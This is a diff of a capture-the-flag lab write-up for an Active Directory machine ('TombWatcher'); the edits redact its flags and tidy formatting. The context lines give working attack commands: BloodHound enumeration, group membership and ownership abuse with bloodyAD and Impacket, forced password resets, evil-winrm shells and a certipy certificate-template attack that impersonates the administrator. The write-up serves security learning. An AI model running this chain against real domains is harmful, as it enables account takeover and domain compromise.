@@ -20,7 +20,6 @@ sudo nmap -sS -Pn -n -p- -sC -sV 10.10.11.72 -oN nmap.dump
 
 # Foothold
 We have some credentials as starter: `henry:H3nry_987TGV!`:
-
 ```bash
 bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -dc DC01.tombwatcher.htb -c All -o bloodhound_results.json -ns 10.10.11.72
 ```
@@ -81,18 +80,20 @@ alfred -> no group but AddSelf on INFRASTRUCTURE
 
 
 - THIS ADD DOES NOT WORK! ????
+
 ```bash
 net rpc group addmem "INFRASTRUCTURE" "alfred" -U "TOMBWATCHER.HTB"/"alfred"%"basketball" -S DC01.TOMBWATCHER.HTB
 Could not add alfred to INFRASTRUCTURE: NT_STATUS_ACCESS_DENIED
 ```
 
 - THIS ADD DOES WORK
+
 ```bash
 python3 bloodyAD.py -u 'alfred' -p 'basketball' -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred
 [+] alfred added to INFRASTRUCTURE
 ```
 
-CHECKing: 
+Checking: 
 ```bash
 net rpc group members "Infrastructure" -U 'TOMBWATCHER.HTB/alfred%basketball' -S 10.10.11.72
 TOMBWATCHER\Alfred
@@ -119,7 +120,7 @@ owneredit.py -action write -new-owner 'SAM' -target 'JOHN' 'TOMBWATCHER.HTB'/'SA
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 ```
 
-THIS FAILS BECAUSE OF LDAP: https://github.com/cannatag/ldap3/issues/1051
+THIS FAILS BECAUSE OF LDAP: `https://github.com/cannatag/ldap3/issues/1051`
 
 ```bash
 pip3 install -r requirements.txt
@@ -204,7 +205,7 @@ python3 .env/bin/dacledit.py -action 'write' -rights 'FullControl' -principal 'S
 ```
 
 
-Now we can set the password
+Now we can set the password:
 ```bash
 net rpc password john "Password123456!" -U "TOMBWATCHER.HTB"/"SAM"%"Password123456!" -S 10.10.11.72
 # OR
@@ -214,7 +215,7 @@ python3 bloodyAD.py --host 10.10.11.72 -d tombwatcher.htb -u 'SAM' -p 'Password1
 ```bash
 evil-winrm -i 10.10.11.72 -u JOHN -p 'Password123456!'
 *Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
-7826f6a6230b9e9af5c0c09af1c71d49
+...
 ```
 
 # Root
@@ -310,10 +311,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 ```
 
 
-Restoring first cert_admin didnt work:
-
-Restoring last one:
-
+Restoring first `cert_admin` didnt work but last one did:
 ```bash
 Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
 net rpc password cert_admin "Password123456!" -U "TOMBWATCHER.HTB"/"JOHN"%"Password123456!" -S 10.10.11.72
@@ -392,7 +390,7 @@ Certificate Templates
 
 VULN!!!!
 
-# First strategy does not work ESC15
+# First strategy does not work - ESC15
 ```bash
 faketime "$(ntpdate -q dc01.tombwatcher.htb | cut -d ' ' -f 1,2)" certipy req -u 'cert_admin' -p 'Password123456!' -dc-ip 10.10.11.72  -target 'DC01.TOMBWATCHER.HTB' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500'
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
@@ -455,5 +453,5 @@ Evil-WinRM shell v3.5
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-05a2f195657648e3d983c575b9d1c2d7
+...
 ```
